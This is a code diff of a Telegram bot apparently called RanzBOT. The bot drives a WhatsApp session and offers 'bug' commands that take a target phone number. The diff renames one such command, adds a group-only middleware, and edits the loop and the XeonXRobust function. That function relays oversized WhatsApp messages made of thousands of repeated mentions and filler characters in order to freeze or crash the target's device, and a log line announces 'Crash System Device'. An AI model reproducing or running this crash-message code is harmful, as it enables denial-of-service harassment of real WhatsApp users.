@@ -631,6 +631,41 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
 
   return ctx.reply('Cek Ae Mas.');
 });
+bot.command('grouponly', (ctx) => {
+  const userId = ctx.from.id.toString();
+
+  if (userId !== OWNER_ID && !isAdmin(userId)) {
+    return ctx.reply('❌ You are not authorized to use this command.');
+  }
+
+  botForGroup = true;
+  botForPrivateChat = false;
+  ctx.reply(`
+╭──(  ✅ Success    ) 
+│ Bot diatur untuk hanya merespon di Grup!
+╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
+});
+const checkChatType = (ctx, next) => {
+  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
+    return;
+  }
+
+  if (botForPrivateChat && ctx.chat.type !== 'private') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
+    return;
+  }
+
+  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
+};
+bot.use((ctx, next) => {
+  // Set variabel global untuk menentukan tipe bot
+  botForGroup = true; // Hanya untuk grup
+  botForPrivateChat = false; // Tidak untuk private chat
+
+  // Gunakan middleware
+  checkChatType(ctx, next);
+});
 bot.command("xcandro", checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
@@ -664,7 +699,7 @@ bot.command("xcandro", checkWhatsAppConnection, async ctx => {
 
   return ctx.reply('Cek Ae Mas.');
 });
-bot.command("xcblank1", checkWhatsAppConnection, async ctx => {
+bot.command("xranz", checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -682,29 +717,8 @@ bot.command("xcblank1", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 60; i++) {
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
-    await XeonXRobust(target, { ptcp: true });
-    await thunderblast_notif(target);
-    await XeonXRobust(target, { ptcp: true });
+  for (let i = 0; i < 30; i++) {
+    await XeonXRobust(target, { ptcp: true });    
   }
 
   // Menyelesaikan proses response
@@ -1052,7 +1066,7 @@ Selamat ${greeting}!
 │
 ├━━━「 🎯𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 」━━━⬣
 │ ᝄ ⌜ 𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 ⌟
-│変-> /xcbeta [62xxx]
+│変-> /xranz [62xxx]
 │変-> /xcblank1 [62xxx]
 ⟣──────────
 > © RanzBOT.1
@@ -1365,7 +1379,7 @@ console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
-  const ui = "ꦽ".repeat(10000);
+  const ui = "ㅤ".repeat(10000);
   await cella.relayMessage(target, {
     ephemeralMessage: {
       message: {
@@ -1388,7 +1402,7 @@ async function XeonXRobust(target, Ptcp = true) {
             hasMediaAttachment: true
           },
           body: {
-            text: "Will You Be Mine? :D" + ui + jids
+            text: "ㅤㅤㅤㅤㅤㅤ" + ui + jids
           },
           contextInfo: {
             mentionedJid: ["0@s.whatsapp.net"],
